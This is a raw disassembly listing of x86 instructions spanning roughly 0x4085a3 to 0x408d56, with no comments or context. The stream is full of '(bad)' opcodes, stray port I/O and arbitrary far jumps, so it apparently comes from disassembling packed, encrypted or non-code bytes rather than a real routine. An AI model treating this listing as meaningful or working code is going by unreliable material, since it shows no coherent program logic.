  4085a3:	ins    BYTE PTR es:[edi],dx
  4085a4:	jl     0x4085c7
  4085a6:	jbe    0x408593
  4085a8:	add    DWORD PTR [ecx+0x3b],eax
  4085ab:	nop
  4085ac:	jge    0x408580
  4085ae:	(bad)  
  4085af:	(bad)  [esi]
  4085b1:	mov    al,BYTE PTR [ebx+edi*1]
  4085b4:	pushf  
  4085b5:	jne    0x4085a9
  4085b7:	or     al,0x75
  4085b9:	cmp    eax,0x13c2fec9
  4085be:	sub    dl,al
  4085c0:	shr    DWORD PTR [ebx-0x2b],0xf2
  4085c4:	sbb    cl,0x15
  4085c7:	dec    esp
  4085c8:	adc    edi,DWORD PTR [edx-0x75a2f67e]
  4085ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085cf:	xor    eax,0x73ecdfd1
  4085d4:	fwait
  4085d5:	xchg   edi,eax
  4085d6:	or     BYTE PTR [ecx+0xd7ee7fe],al
  4085dc:	sbb    BYTE PTR [edx-0x107f6064],dl
  4085e2:	pushf  
  4085e3:	(bad)  
  4085e4:	cmovbe ecx,DWORD PTR [eax]
  4085e7:	jmp    0x2019:0x7702e2c1
  4085ee:	fsubr  DWORD PTR [ecx+ecx*2]
  4085f1:	adc    al,0x13
  4085f3:	fnstcw WORD PTR [esp+edi*4]
  4085f6:	fld    DWORD PTR [ecx+0x727e485c]
  4085fc:	mov    al,0x6a
  4085fe:	or     ecx,DWORD PTR [esi+0x197ecb23]
  408604:	mov    esp,es
  408606:	and    BYTE PTR [ebx],0x6b
  408609:	add    al,ah
  40860b:	sub    ah,al
  40860d:	pop    esi
  40860e:	rcl    DWORD PTR [eax],0x75
  408611:	mov    ds:0xfd8e9260,al
  408616:	int3   
  408617:	cmc    
  408618:	mov    edi,0x8b4de816
  40861d:	(bad)  
  40861e:	sub    edi,ebp
  408620:	jg     0x408630
  408622:	dec    edi
  408623:	dec    edx
  408624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408625:	dec    ebp
  408626:	inc    edi
  408627:	jne    0x40861c
  408629:	or     bl,BYTE PTR [esi-0x54]
  40862c:	push   es
  40862d:	mov    DWORD PTR [ecx],esi
  40862f:	out    dx,eax
  408630:	or     DWORD PTR [ecx],0x5d710ac
  408636:	pop    ebx
  408637:	add    ch,BYTE PTR [ebp-0xf8c7f7c]
  40863d:	dec    esp
  40863e:	adc    al,0x42
  408640:	inc    ecx
  408641:	mov    eax,ds:0xc567b6cd
  408646:	dec    edx
  408647:	mov    al,ds:0x85f4dc3b
  40864c:	sbb    al,0x21
  40864e:	mov    cl,al
  408650:	retf   
  408651:	hlt    
  408652:	sub    cl,BYTE PTR [esp+eax*4+0x3d0ad40]
  408659:	add    DWORD PTR [eax],ecx
  40865b:	mov    eax,0x31f40767
  408660:	adc    al,0xf5
  408662:	sub    al,0x7
  408664:	inc    edi
  408665:	xchg   esp,eax
  408666:	inc    eax
  408667:	xor    DWORD PTR [ecx-0x60],0xd
  40866b:	in     al,0x2c
  40866d:	mov    ecx,0xbb8936b2
  408672:	(bad)  
  408673:	je     0x408635
  408675:	add    dh,BYTE PTR [ecx]
  408677:	ret    
  408678:	daa    
  408679:	cmp    BYTE PTR [eax+0x20],0x1
  40867d:	cmp    DWORD PTR [ebp+0x6b],0x7ec042ec
  408684:	add    BYTE PTR [eax+0x75],0xf
  408688:	ud2    
  40868a:	jmp    0x4086aa
  40868c:	daa    
  40868d:	sbb    al,0xc1
  40868f:	inc    esi
  408690:	clc    
  408691:	add    dh,BYTE PTR [ebp+0x15]
  408694:	xor    BYTE PTR [ebx*1+0x607218e7],0x11
  40869c:	xchg   BYTE PTR [ecx+0x1e9c28c7],ah
  4086a2:	ret    
  4086a3:	mov    ds:0xd8deaba2,eax
  4086a8:	add    al,0x47
  4086aa:	adc    dh,dh
  4086ac:	xchg   ecx,eax
  4086ad:	pop    ss
  4086ae:	fwait
  4086af:	ss pop ecx
  4086b1:	xchg   edx,eax
  4086b2:	inc    ebx
  4086b3:	cmc    
  4086b4:	and    edx,DWORD PTR [edx+0xc1962a0]
  4086ba:	nop
  4086bb:	add    esi,ebp
  4086bd:	sub    cl,BYTE PTR [ebx-0x44]
  4086c0:	inc    ecx
  4086c1:	rcr    BYTE PTR [edx],0x6f
  4086c4:	xchg   edx,eax
  4086c5:	add    DWORD PTR [eax],edx
  4086c7:	sbb    BYTE PTR [ecx],dl
  4086c9:	nop
  4086ca:	and    DWORD PTR [edx+eiz*4-0x2ecbafb8],eax
  4086d1:	inc    ecx
  4086d2:	xchg   edx,eax
  4086d3:	jne    0x4086e6
  4086d5:	xlat   BYTE PTR ds:[ebx]
  4086d6:	sbb    bl,BYTE PTR [ecx+0x55]
  4086d9:	out    dx,al
  4086da:	cmc    
  4086db:	js     0x40871c
  4086dd:	jecxz  0x408707
  4086df:	mov    BYTE PTR [esp+ecx*4],bh
  4086e2:	sbb    esi,esi
  4086e4:	xor    bl,BYTE PTR ds:0xa7da84ea
  4086ea:	sbb    eax,0x20b70695
  4086ef:	push   cs
  4086f0:	jne    0x40868c
  4086f2:	or     al,0xa1
  4086f4:	mov    ds:0xb3ce801e,eax
  4086f9:	xchg   dh,dh
  4086fb:	dec    eax
  4086fc:	mov    edx,0x1e5b06ec
  408701:	sub    BYTE PTR [edx+0x3390bf0],0xcc
  408708:	enter  0x4e76,0x85
  40870c:	pop    ds
  40870d:	hlt    
  40870e:	clc    
  40870f:	rol    DWORD PTR [eax+0x2cc03588],0xfa
  408716:	push   ebp
  408717:	and    esp,DWORD PTR [ebx-0x1a86af7e]
  40871d:	or     bh,BYTE PTR [ecx+0x59]
  408720:	mov    ebx,0x880339f6
  408725:	mov    bl,0x56
  408727:	mov    ds:0xd8849d6e,eax
  40872c:	nop
  40872d:	in     al,0xec
  40872f:	cmp    DWORD PTR [ebx+ecx*4-0x523a804],ebp
  408736:	into   
  408737:	push   ss
  408738:	ss cdq 
  40873a:	in     eax,dx
  40873b:	sahf   
  40873c:	or     al,0xc7
  40873e:	add    al,dl
  408740:	(bad)
  408744:	mov    si,0xe60c
  408748:	pop    edx
  408749:	jbe    0x408779
  40874b:	jbe    0x408771
  40874d:	xor    al,0xe
  40874f:	ror    DWORD PTR [ebx],0xe2
  408752:	or     DWORD PTR [edx+0x1602fec9],ecx
  408758:	add    DWORD PTR [eax+0x1f],ebp
  40875b:	or     edi,ecx
  40875d:	test   DWORD PTR [edi+edi*8],0x461a3c37
  408764:	jb     0x4087c6
  408766:	pop    es
  408767:	xor    BYTE PTR [edx+edi*4+0x31581af4],cl
  40876e:	mov    ds:0xa4ca76a,eax
  408773:	or     BYTE PTR [esi],ah
  408775:	out    dx,eax
  408776:	iret   
  408777:	nop
  408778:	and    DWORD PTR [ecx-0x2e68f97c],edi
  40877e:	cmc    
  40877f:	pusha  
  408780:	xor    BYTE PTR [eax+0x16],cl
  408783:	dec    ebx
  408784:	ins    BYTE PTR es:[edi],dx
  408785:	adc    al,0xd5
  408787:	push   ss
  408788:	test   dl,ch
  40878a:	clc    
  40878b:	int    0x27
  40878d:	aaa    
  40878e:	mov    DWORD PTR [edi+0xb11935e],0x3a71bef9
  408798:	pop    ds
  408799:	mov    esp,0xcf2b38ba
  40879e:	dec    ecx
  40879f:	popa   
  4087a0:	and    al,0x14
  4087a2:	rol    BYTE PTR [ebx+ecx*2+0x2028f4bb],0xcf
  4087aa:	add    BYTE PTR [edx+0x2bf8e85e],bl
  4087b0:	mov    bl,0x43
  4087b2:	push   es
  4087b3:	cmp    edi,eax
  4087b5:	rcl    BYTE PTR ds:0x1178f80e,1
  4087bb:	cmc    
  4087bc:	scas   al,BYTE PTR es:[edi]
  4087bd:	mov    dh,al
  4087bf:	mov    BYTE PTR ds:0xccdb3346,ch
  4087c5:	inc    ecx
  4087c6:	icebp  
  4087c7:	out    dx,eax
  4087c8:	push   0x16
  4087ca:	cmp    bh,bh
  4087cc:	push   edi
  4087cd:	or     al,0xbf
  4087cf:	or     eax,0xd188fbf1
  4087d4:	add    DWORD PTR [esi],ebx
  4087d6:	pop    edx
  4087d7:	sbb    BYTE PTR [ebx+eax*2],bh
  4087da:	cmp    al,0x3b
  4087dc:	and    BYTE PTR [esp+edi*1],ch
  4087df:	(bad)  
  4087e0:	and    al,bh
  4087e2:	adc    eax,0x838cf95e
  4087e7:	loop   0x40877e
  4087e9:	adc    al,0xb6
  4087eb:	clc    
  4087ec:	xor    ah,dh
  4087ee:	xchg   esp,eax
  4087ef:	and    al,0x56
  4087f1:	ret    0xf33d
  4087f4:	cmp    DWORD PTR [edx+eax*1-0x66],0x5c
  4087f9:	sbb    al,ch
  4087fb:	adc    BYTE PTR [ebx-0x3],ch
  4087fe:	dec    ebx
  4087ff:	ss fs mov cl,0xbc
  408803:	(bad)  
  408804:	mov    cl,0x44
  408806:	mov    esi,ebx
  408808:	mov    al,BYTE PTR [esi-0x4a]
  40880b:	pop    ss
  40880c:	or     al,0xd7
  40880e:	retf   
  40880f:	mov    BYTE PTR [edx+0x4],al
  408812:	or     BYTE PTR [edi],al
  408814:	pop    es
  408815:	push   0x64
  408817:	sbb    DWORD PTR [ecx+0x6],ebx
  40881a:	push   es
  40881b:	add    eax,0xdf607205
  408820:	adc    edx,0xcdad40bc
  408826:	dec    eax
  408827:	(bad)  
  408828:	hlt    
  408829:	inc    esi
  40882a:	jecxz  0x4087d6
  40882c:	fs iret 
  40882e:	xor    ah,ah
  408830:	stos   BYTE PTR es:[edi],al
  408831:	(bad)  
  408832:	cld    
  408833:	mov    edx,0xa810e264
  408838:	mov    DWORD PTR [eax],esi
  40883a:	fisub  WORD PTR [edi+0x51]
  40883d:	jo     0x408845
  40883f:	outs   dx,DWORD PTR ds:[esi]
  408840:	push   esi
  408841:	jo     0x4088b3
  408843:	ja     0x4088a6
  408845:	fisttp WORD PTR [edi+0x5b]
  408848:	sub    eax,0xc60e01b3
  40884d:	mov    ebx,0x6fd91327
  408852:	(bad)  
  408854:	(bad)  
  408855:	daa    
  408856:	clc    
  408857:	push   0xf3804ea0
  40885c:	add    ebx,ebp
  40885e:	adc    BYTE PTR [ecx],dl
  408860:	fild   DWORD PTR [esi]
  408862:	inc    ebp
  408863:	test   BYTE PTR [ecx+0x2e],dh
  408866:	lahf   
  408867:	pop    ecx
  408868:	ret    
  408869:	adc    eax,0xc054c049
  40886e:	jnp    0x4087f2
  408870:	xor    DWORD PTR [eax],ebp
  408872:	jo     0x4088d7
  408874:	mov    edx,0x7551d50
  408879:	imul   ebx,DWORD PTR [ecx-0x4],0x8
  40887d:	add    ebp,DWORD PTR [esp+ecx*8+0x32b5e2f8]
  408884:	sub    eax,0xd2d2a9c8
  408889:	or     al,0xe0
  40888b:	push   ecx
  40888c:	jno    0x408872
  40888e:	xchg   ecx,eax
  40888f:	(bad)  
  408890:	push   0x30
  408892:	pop    eax
  408893:	nop
  408894:	mov    bh,bh
  408896:	clc    
  408897:	leave  
  408898:	js     0x408828
  40889a:	xor    DWORD PTR [esi+0x7],esi
  40889d:	cmp    DWORD PTR [ecx+0x63640f1f],0x22f0ec90
  4088a7:	in     al,dx
  4088a8:	cli    
  4088a9:	cmp    DWORD PTR [ecx-0x54d9576f],ebp
  4088af:	cld    
  4088b0:	push   DWORD PTR [eax-0x55]
  4088b3:	popa   
  4088b4:	add    al,0x1a
  4088b6:	mov    DWORD PTR [ebp+0x3b],esi
  4088b9:	nop
  4088ba:	addr16 in al,0xa3
  4088bd:	ins    BYTE PTR es:[edi],dx
  4088be:	push   ds
  4088bf:	xor    al,dh
  4088c1:	cld    
  4088c2:	stos   BYTE PTR es:[edi],al
  4088c3:	add    esi,DWORD PTR [edx+0x2f50f071]
  4088c9:	in     al,dx
  4088ca:	push   ebp
  4088cb:	in     al,dx
  4088cc:	mov    edx,0xa71b428e
  4088d1:	xor    DWORD PTR [eax],ebx
  4088d3:	jl     0x4088f6
  4088d5:	rcl    DWORD PTR [eax+0x1],cl
  4088d8:	push   esp
  4088d9:	repz xor cl,BYTE PTR [edx+0x240fa4a]
  4088e0:	push   ss
  4088e1:	test   DWORD PTR [esi+eax*2],edx
  4088e4:	jne    0x40895d
  4088e6:	mov    bl,0x42
  4088e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e9:	nop
  4088ea:	inc    edi
  4088eb:	cli    
  4088ec:	dec    eax
  4088ed:	sar    BYTE PTR [ebx+ecx*4],0x60
  4088f1:	adc    al,0x70
  4088f3:	mov    dh,0xfa
  4088f5:	sar    BYTE PTR [esi-0x3968db5b],1
  4088fb:	inc    eax
  4088fc:	ret    
  4088fd:	pop    ebx
  4088fe:	dec    esp
  4088ff:	push   0x9bc0e900
  408904:	xlat   BYTE PTR ds:[ebx]
  408905:	loop   0x408960
  408907:	daa    
  408908:	adc    BYTE PTR ds:0xf09b3f23,ch
  40890e:	and    BYTE PTR [edi],ah
  408910:	jmp    0x9c348b82
  408915:	pop    edi
  408916:	sti    
  408917:	mov    eax,0x1e4c2c96
  40891c:	sti    
  40891d:	xchg   esi,eax
  40891e:	cs hlt 
  408920:	repnz pusha 
  408922:	cmp    ch,cl
  408924:	or     DWORD PTR [ecx-0x1c],ecx
  408927:	dec    eax
  408928:	(bad)  
  408929:	and    eax,0x55484063
  40892e:	and    BYTE PTR [ebx+0x3bd26e7b],dh
  408934:	jo     0x40894b
  408936:	jmp    0x9269:0x10c1849
  40893d:	in     eax,0x20
  40893f:	clc    
  408940:	and    al,0x87
  408942:	xchg   edx,eax
  408943:	test   DWORD PTR [ebx],eax
  408945:	leave  
  408946:	sti    
  408947:	popf   
  408948:	sti    
  408949:	mov    edi,0x1d56f07e
  40894e:	xchg   esi,eax
  40894f:	mov    al,0x7b
  408951:	in     eax,dx
  408952:	mov    bh,0xa1
  408954:	xchg   DWORD PTR [eax+0x48],esp
  408957:	dec    ebx
  408958:	inc    ebp
  408959:	cld    
  40895a:	sbb    esp,edi
  40895c:	sbb    BYTE PTR [ecx],al
  40895e:	jl     0x408961
  408960:	cdq    
  408961:	sbb    al,0xe4
  408963:	xchg   edi,eax
  408964:	jl     0x4088e9
  408966:	and    BYTE PTR [eiz*2-0x327749c],bh
  40896d:	pusha  
  40896e:	adc    BYTE PTR ds:0x18e32090,cl
  408974:	xchg   ecx,eax
  408975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408976:	push   0xffffff88
  408978:	loopne 0x408900
  40897a:	pop    ebx
  40897b:	fwait
  40897c:	nop
  40897d:	push   ds
  40897e:	std    
  40897f:	xor    esp,ecx
  408981:	adc    al,0x18
  408983:	mov    ebp,0xcd93acdb
  408988:	push   es
  408989:	popf   
  40898a:	in     al,0xfd
  40898c:	dec    esp
  40898d:	jne    0x408935
  40898f:	ror    DWORD PTR [esi-0x2f],1
  408992:	jp     0x4089c6
  408994:	inc    esi
  408995:	(bad)  
  408996:	push   eax
  408997:	cmp    al,0x46
  408999:	sub    bl,BYTE PTR [eax-0x720ff8f4]
  40899f:	loopne 0x40897b
  4089a1:	(bad)  
  4089a2:	ins    BYTE PTR es:[edi],dx
  4089a3:	adc    edi,DWORD PTR [ecx+ecx*1+0x3f803e4]
  4089aa:	(bad)  
  4089ac:	sub    dl,bh
  4089ae:	dec    eax
  4089af:	jl     0x408969
  4089b1:	stos   DWORD PTR es:[edi],eax
  4089b2:	mov    al,ds:0xf32e36cb
  4089b7:	xchg   edx,eax
  4089b8:	rcr    DWORD PTR [edx],0xaa
  4089bb:	push   eax
  4089bc:	in     al,dx
  4089bd:	dec    ebp
  4089be:	pop    eax
  4089bf:	dec    esp
  4089c0:	mov    edx,0x55e8e4c3
  4089c5:	dec    ebp
  4089c6:	call   0x507970cb
  4089cb:	fcom   DWORD PTR ss:[eax]
  4089ce:	inc    edi
  4089cf:	(bad)  
  4089d0:	cmp    eax,0x5d01e683
  4089d5:	or     al,0xe4
  4089d7:	sbb    eax,0xb15048e4
  4089dc:	and    eax,0xe8422273
  4089e1:	sub    BYTE PTR [esi],cl
  4089e3:	std    
  4089e4:	cmp    ch,BYTE PTR [esi-0x7a7e85fd]
  4089ea:	push   ecx
  4089eb:	adc    al,0x97
  4089ed:	retf   
  4089ee:	and    ebp,DWORD PTR [edx]
  4089f0:	add    DWORD PTR [ebx],esp
  4089f2:	mov    fs,WORD PTR [edi+0x6]
  4089f5:	add    al,0x82
  4089f7:	sbb    al,0xfd
  4089f9:	enter  0x2cb3,0x3d
  4089fd:	sub    bh,BYTE PTR [edx]
  4089ff:	jmp    0x243582c2
  408a04:	daa    
  408a05:	es mov bh,0x20
  408a08:	mov    BYTE PTR [ecx*2-0x613fff04],cl
  408a0f:	pop    ebx
  408a10:	mov    dh,0xd
  408a12:	xchg   edx,eax
  408a13:	clc    
  408a14:	fsubr  QWORD PTR [edx]
  408a16:	imul   ebx,DWORD PTR [ecx-0x1fb73cff],0x9f1e9ccf
  408a20:	push   ds
  408a21:	xchg   esi,eax
  408a22:	adc    DWORD PTR ds:0x6fecaf2b,ebp
  408a28:	adc    esi,edx
  408a2a:	ret    0xfe90
  408a2d:	lahf   
  408a2e:	dec    eax
  408a2f:	push   0xb040677c
  408a34:	ror    al,0xc
  408a37:	mov    dh,0x91
  408a39:	cmp    al,0x56
  408a3b:	in     eax,0xda
  408a3d:	loopne 0x408a46
  408a3f:	mov    BYTE PTR [ecx],al
  408a41:	add    al,0xbe
  408a43:	rol    BYTE PTR [ebx],1
  408a45:	test   al,0x5c
  408a47:	mov    eax,DWORD PTR [ecx]
  408a49:	jge    0x408a52
  408a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a4c:	push   esp
  408a4d:	cmp    al,0x45
  408a4f:	mov    esp,0x26254dee
  408a54:	push   esp
  408a55:	xchg   ebp,eax
  408a56:	jb     0x4089db
  408a58:	or     eax,0x4f66e2f
  408a5d:	cmc    
  408a5e:	xchg   esp,eax
  408a5f:	dec    esi
  408a60:	call   0xbb6bcd2c
  408a65:	aam    0x7c
  408a67:	(bad)  
  408a68:	ud0    ebp,DWORD PTR [esi*2-0x27b2365c]
  408a70:	sbb    al,0xd1
  408a72:	(bad)  
  408a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a74:	daa    
  408a75:	add    BYTE PTR [esi+0x63],al
  408a78:	inc    eax
  408a79:	int3   
  408a7a:	int3   
  408a7b:	nop
  408a7c:	(bad)  
  408a7d:	jecxz  0x408a54
  408a7f:	add    DWORD PTR ds:0xe9e3596b,eax
  408a85:	std    
  408a86:	leave  
  408a87:	xor    eax,0xd614bc4d
  408a8c:	adc    dh,BYTE PTR [edi+0x3b]
  408a8f:	call   0xc15b9208
  408a94:	dec    ebx
  408a95:	add    DWORD PTR [edi+ebp*8+0x5dcace83],esi
  408a9c:	test   BYTE PTR [ebx+0x49],bl
  408a9f:	push   ecx
  408aa0:	add    DWORD PTR [esi],0x3
  408aa3:	push   cs
  408aa4:	fld    DWORD PTR [esi+0x24080ba5]
  408aaa:	mov    DWORD PTR [esi],ebx
  408aac:	or     bh,BYTE PTR [eax+0x4]
  408aaf:	jmp    0x408a4c
  408ab1:	push   0x5d
  408ab3:	stos   DWORD PTR es:[edi],eax
  408ab4:	or     edx,DWORD PTR [esi]
  408ab6:	sbb    cl,dl
  408ab8:	fiadd  DWORD PTR [eax-0x4e]
  408abb:	call   0xa08c:0x9d673b0d
  408ac2:	jmp    0x408ac3
  408ac4:	pop    esp
  408ac5:	xchg   edi,eax
  408ac6:	mov    esi,DWORD PTR [ebx+0x1c]
  408ac9:	jns    0x408b0b
  408acb:	call   0x643fb43c
  408ad0:	mov    esp,DWORD PTR [edx]
  408ad2:	dec    eax
  408ad3:	nop
  408ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad5:	test   al,0x92
  408ad7:	fwait
  408ad8:	add    edx,esi
  408ada:	gs popf 
  408adc:	mov    edi,eax
  408ade:	add    DWORD PTR [ecx],0x3700500
  408ae4:	inc    edx
  408ae5:	mov    esp,eax
  408ae7:	fwait
  408ae8:	adc    dh,BYTE PTR [ebx+0x7fa690ee]
  408aee:	jg     0x408afa
  408af0:	mov    al,ds:0xa8df02b
  408af5:	into   
  408af6:	push   ebp
  408af7:	or     ebp,esp
  408af9:	lods   al,BYTE PTR ds:[esi]
  408afa:	ja     0x408b12
  408afc:	dec    ebx
  408afd:	or     al,0xb
  408aff:	ja     0x408b2d
  408b01:	mov    esi,DWORD PTR [eax-0x10f14f53]
  408b07:	push   ecx
  408b08:	(bad)  
  408b0a:	add    esp,DWORD PTR [eax+0x177f5490]
  408b10:	pop    ebp
  408b11:	or     BYTE PTR [eax],al
  408b13:	add    al,0x73
  408b15:	icebp  
  408b16:	push   ss
  408b17:	test   al,0xc9
  408b19:	sub    DWORD PTR [esi-0x1b9b074b],0x34042790
  408b23:	add    DWORD PTR [eax],eax
  408b25:	cwde   
  408b26:	clc    
  408b27:	rol    bl,0xc
  408b2a:	add    esi,DWORD PTR [ecx-0x6fa8b7f5]
  408b30:	sbb    eax,0x640181d8
  408b35:	xchg   edx,eax
  408b36:	lahf   
  408b37:	scas   eax,DWORD PTR es:[edi]
  408b38:	adc    DWORD PTR [ecx],ecx
  408b3a:	inc    esi
  408b3b:	jb     0x408af9
  408b3d:	stc    
  408b3e:	ret    
  408b3f:	dec    eax
  408b40:	push   esp
  408b41:	popf   
  408b42:	adc    edx,DWORD PTR [ecx-0x5b]
  408b45:	lock into 
  408b47:	adc    eax,0x70b3b0f4
  408b4c:	call   0xc595d35b
  408b51:	or     dh,bl
  408b53:	jnp    0x408b42
  408b55:	or     eax,0x48c26e6f
  408b5a:	push   0x68747709
  408b5f:	popa   
  408b60:	sbb    edx,DWORD PTR [edx+0x755ea0d0]
  408b66:	adc    DWORD PTR [eax-0x4f4aef19],edx
  408b6c:	js     0x408b6f
  408b6e:	jnp    0x408b3a
  408b70:	or     dl,dh
  408b72:	fsubr  DWORD PTR [ebx-0x23d5886b]
  408b78:	xor    BYTE PTR [eax-0x15e261d2],0x12
  408b7f:	adc    ah,ah
  408b81:	push   eax
  408b82:	fsubrp st(2),st
  408b84:	ins    BYTE PTR es:[edi],dx
  408b85:	mov    al,0x91
  408b87:	sbb    al,0x1
  408b89:	cmp    BYTE PTR [ebx],0x98
  408b8c:	and    al,0xe3
  408b8e:	xchg   ecx,eax
  408b8f:	xchg   edx,eax
  408b90:	push   cs
  408b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b92:	xlat   BYTE PTR ds:[ebx]
  408b93:	sti    
  408b94:	xchg   edi,eax
  408b95:	and    ecx,0xb068060a
  408b9b:	call   0x101:0x7c90d81c
  408ba2:	idiv   DWORD PTR [eax+0x56]
  408ba5:	(bad)  
  408ba6:	push   esp
  408ba7:	lds    esp,FWORD PTR [ecx+0x65]
  408baa:	call   0x3b90:0xa360c0ef
  408bb1:	not    BYTE PTR [ecx+0x32]
  408bb4:	jbe    0x408ba5
  408bb6:	push   ecx
  408bb7:	mov    ch,0xb8
  408bb9:	pop    ecx
  408bba:	je     0x408bc8
  408bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bbd:	or     eax,0x340b2790
  408bc2:	add    DWORD PTR [edx],eax
  408bc4:	pop    eax
  408bc5:	push   cs
  408bc6:	mov    ebp,0x5aeb4009
  408bcb:	xchg   edx,eax
  408bcc:	pop    es
  408bcd:	pop    ss
  408bce:	push   ebp
  408bcf:	or     BYTE PTR [ecx+0x8],0x36
  408bd3:	mov    esp,0x10dd4143
  408bd8:	lea    eax,[edi]
  408bda:	(bad)  
  408bdb:	jns    0x408bf4
  408bdd:	push   ss
  408bde:	add    al,0xe6
  408be0:	push   edi
  408be1:	xchg   ebp,eax
  408be2:	inc    ebx
  408be3:	or     al,0xa7
  408be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408be6:	sub    ch,BYTE PTR [esi-0x30246c94]
  408bec:	xchg   DWORD PTR [ebp-0x60],eax
  408bef:	call   0x4a4:0x2c9d85d6
  408bf6:	jb     0x408c58
  408bf8:	mov    edx,esp
  408bfa:	jg     0x408b80
  408bfc:	in     al,0x91
  408bfe:	xor    al,0x7e
  408c00:	add    ebx,DWORD PTR [ecx+edx*1+0x6715dc86]
  408c07:	add    DWORD PTR [ebx],eax
  408c09:	jg     0x408bee
  408c0b:	or     eax,0x260776a2
  408c10:	inc    eax
  408c11:	jmp    0x408c4c
  408c13:	ins    BYTE PTR es:[edi],dx
  408c14:	lahf   
  408c15:	lods   eax,DWORD PTR ds:[esi]
  408c16:	in     eax,dx
  408c17:	das    
  408c18:	ror    DWORD PTR [edx-0x7ff544ed],0xea
  408c1f:	or     dh,BYTE PTR [ebp+eax*1+0x4]
  408c23:	add    esp,DWORD PTR [ebp-0x5c]
  408c26:	add    eax,0x2b3706e2
  408c2b:	enter  0x9266,0x91
  408c2f:	ins    BYTE PTR es:[edi],dx
  408c30:	in     eax,dx
  408c31:	adc    DWORD PTR [eax+0xd3b80fe],0x75
  408c38:	sub    eax,0x301c0a05
  408c3d:	push   ss
  408c3e:	mov    cl,bh
  408c40:	ret    0x3e6
  408c43:	xchg   BYTE PTR [eax],bl
  408c45:	and    edi,DWORD PTR [ecx]
  408c47:	nop
  408c48:	add    esp,DWORD PTR [ebx+0x20c6e4e4]
  408c4e:	stos   DWORD PTR es:[edi],eax
  408c4f:	daa    
  408c50:	mov    dl,0x4
  408c52:	and    cl,BYTE PTR [eax+ecx*1]
  408c55:	sbb    al,0xe
  408c57:	pop    ss
  408c58:	scas   al,BYTE PTR es:[edi]
  408c59:	push   ds
  408c5a:	pop    ds
  408c5b:	sbb    BYTE PTR [ecx],al
  408c5d:	fld    st(2)
  408c5f:	mov    cl,0xf4
  408c61:	mov    cl,0x16
  408c63:	rcr    DWORD PTR [edx],0x78
  408c66:	pop    ss
  408c67:	les    ebp,FWORD PTR [ecx]
  408c69:	in     al,0xb
  408c6b:	mov    edx,DWORD PTR [eax]
  408c6d:	inc    edx
  408c6e:	stos   BYTE PTR es:[edi],al
  408c6f:	pop    ebx
  408c70:	push   eax
  408c71:	sub    esi,esi
  408c73:	cld    
  408c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c75:	sahf   
  408c76:	add    eax,0x67785d1e
  408c7b:	test   BYTE PTR [ebx+0x4],0x4
  408c7f:	mov    edx,gs
  408c81:	sar    BYTE PTR [di],1
  408c84:	and    BYTE PTR [eax-0x76],dl
  408c87:	inc    ebx
  408c88:	pop    es
  408c89:	sbb    esi,DWORD PTR [ebp+0x3a3feeed]
  408c8f:	pop    esi
  408c90:	pop    es
  408c91:	jne    0x408c99
  408c93:	test   BYTE PTR [esi+0x1f],0x7
  408c97:	or     BYTE PTR [esi+0x5],0x88
  408c9b:	push   cs
  408c9c:	test   al,0x98
  408c9e:	adc    BYTE PTR [eax+0x2c06341],ah
  408ca4:	sub    al,0xdf
  408ca6:	(bad)  
  408ca7:	mov    eax,DWORD PTR [edx]
  408ca9:	and    al,0x7
  408cab:	sub    BYTE PTR [edx+ebp*2],ch
  408cae:	xor    al,0x41
  408cb0:	ins    BYTE PTR es:[edi],dx
  408cb1:	dec    esp
  408cb2:	mul    DWORD PTR [esi]
  408cb4:	inc    esi
  408cb5:	sbb    BYTE PTR [eax],dl
  408cb7:	out    dx,eax
  408cb8:	in     al,dx
  408cb9:	or     BYTE PTR [esi+0x6e],dh
  408cbc:	inc    esi
  408cbd:	adc    BYTE PTR ds:0x242a1ce9,dl
  408cc3:	rcr    BYTE PTR [ecx],0x85
  408cc6:	adc    al,0xa3
  408cc8:	fisubr DWORD PTR [eax]
  408cca:	(bad)  
  408ccb:	scas   eax,DWORD PTR es:[edi]
  408ccc:	fcom   DWORD PTR [ebx+0x61]
  408ccf:	pop    ss
  408cd0:	loope  0x408d0e
  408cd2:	or     edx,DWORD PTR [ebx]
  408cd4:	ret    
  408cd5:	push   eax
  408cd6:	jno    0x408d1e
  408cd8:	dec    esp
  408cd9:	or     BYTE PTR [ecx-0x7e5df388],0xa8
  408ce0:	adc    al,0xb
  408ce2:	cs xchg ebp,eax
  408ce4:	ins    DWORD PTR es:[edi],dx
  408ce5:	dec    ebp
  408ce6:	xchg   BYTE PTR [edx],bh
  408ce8:	xchg   ebp,eax
  408ce9:	mov    bh,0x9d
  408ceb:	sbb    al,0xb4
  408ced:	sbb    eax,0x50b542e2
  408cf2:	shl    DWORD PTR [esi],1
  408cf4:	iret   
  408cf5:	add    ch,bl
  408cf7:	mov    BYTE PTR [ebx],dh
  408cf9:	ficomp DWORD PTR [esi]
  408cfb:	sti    
  408cfc:	inc    esi
  408cfd:	call   0xb80f:0xa08464c9
  408d04:	call   0x8893:0x653c5432
  408d0b:	xchg   edx,eax
  408d0c:	adc    eax,0xebad2914
  408d11:	aam    0x63
  408d13:	sbb    eax,DWORD PTR [ebx+0x22066620]
  408d19:	rcr    ecx,0xd9
  408d1c:	xchg   esi,eax
  408d1d:	mov    ds:0x7f240774,al
  408d22:	and    BYTE PTR [ebx],bl
  408d24:	sub    DWORD PTR [edx+0x2c2a724c],esi
  408d2a:	sub    BYTE PTR [esi+esi*8],cl
  408d2d:	sbb    eax,0x3314e581
  408d32:	ficom  WORD PTR [edx-0x19bca97c]
  408d38:	push   ss
  408d39:	jns    0x408d69
  408d3b:	in     al,dx
  408d3c:	dec    ebx
  408d3d:	adc    al,0xe9
  408d3f:	inc    ebx
  408d40:	ret    
  408d41:	sub    BYTE PTR [ebx-0x7f8cccec],dl
  408d47:	fisttp DWORD PTR [ebx-0x4c9ec3ec]
  408d4d:	and    eax,0x48d54b2
  408d52:	lock xchg ebx,eax
  408d54:	jl     0x408d81
  408d56:	xchg   esi,eax
